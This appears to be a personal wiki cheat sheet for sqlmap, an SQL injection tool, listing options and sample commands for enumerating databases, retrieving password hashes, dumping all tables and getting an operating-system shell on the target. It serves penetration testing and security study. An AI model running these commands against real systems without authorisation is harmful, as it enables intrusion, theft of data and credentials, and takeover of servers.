An [[SQL Injection]] tool. To show basic help menu, simply type `sqlmap -h`.
### Basic commands:  


| **Options**       | **Description**                                       |
| ----------------- | ----------------------------------------------------- |
| -u URL, --url=URL | Target URL (e.g. "http://www.site.com/vuln.php?id=1") |
| --data=DATA       | Data string to be sent through POST (e.g. "id=1")     |
| --random-agent    | Use randomly selected HTTP User-Agent header value    |
| -p TESTPARAMETER  | Testable parameter(s)                                 |
| --level=LEVEL     | Level of tests to perform (1-5, default 1)            |
| --risk=RISK       | Risk of tests to perform (1-3, default 1)             |
### Enumeration commands:

These options can be used to enumerate the back-end database management system information, structure, and data contained in tables.

| Options           | Description                                |
| ----------------- | ------------------------------------------ |
| -a, --all         | Retrieve everything                        |
| -b, --banner      | Retrieve DBMS banner                       |
| --current-user    | Retrieve DBMS current user                 |
| --passwords       | Enumerate DBMS users password hashes       |
| --dbs             | Enumerate DBMS databases                   |
| --tables          | Enumerate DBMS database tables             |
| --columns         | Enumerate DBMS database table columns      |
| --schema          | Enumerate DBMS schema                      |
| --dump            | Dump DBMS database table entries           |
| --dump-all        | Dump all DBMS databases tables entreis     |
| --is-dba          | Detect if the DBMS current user is DBA     |
| -D <*DB NAME*>    | DBMS database to enumerate                 |
| -T <*TABLE NAME*> | DBMS database table(s) to enumerate        |
| -C COL            | DBMS database table column(s) to enumerate |
### Operating System access commands
These options can be used to access the back-end database management system on the target operating system.

| Options        | Description                                           |
| -------------- | ----------------------------------------------------- |
| --os-shell     | Prompt for an interactive operating system shell      |
| --os-pwn       | Prompt for an OOB shell, Meterpreter or VNC           |
| --os-cmd=OSCMD | Execute an operating system command                   |
| --priv-esc     | Database process user privilege escalation            |
| --os-smbrelay  | One-click prompt for an OOB shell, Meterpreter or VNC |

Note that the tables shown above aren't all the possible switches to use with sqlmap. For a more extensive list of options, run sqlmap -hh to display the advanced help message. 

### **Simple HTTP POST Based Test**

`sqlmap -r <request_file> -p <vulnerable_parameter> --dbs`

Where the request_file is the saved HTTP post request and vulnerable_parameter is it's target parameter.
###  Getting Table Names
**Using GET based Method**
`sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --tables`

**Using POST based Method**
`sqlmap -r req.txt -p <vulnerable_parameter> -D <database_name> --tables`

### Getting Columns Names
**Using GET based Method**
`sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> -T <table_name> --columns`

**Using POST based Method**
`sqlmap -r req.txt -p <vulnerable_parameter> -D <database_name> -T <table_name> --columns`

### Dumping all
**Using GET based Method**
`sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --dump-all`

**Using POST based Method**
`sqlmap -r req.txt -p <vulnerable_parameter> -D <database_name> --dump-all`
